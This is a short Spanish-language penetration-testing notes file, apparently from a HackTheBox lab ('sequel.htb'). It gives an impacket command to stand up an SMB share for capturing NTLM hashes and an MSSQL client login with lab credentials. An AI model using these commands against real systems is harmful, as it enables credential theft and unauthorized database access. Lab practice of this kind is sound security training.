



# smb

crear una carpeta compartida rapida por smb y poder capturar hashes NTLM

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```



## mssql

```bash
impacket-mssqlclient  sequel.htb/PublicUser:GuestUserCantWrite1@sequel.htb
```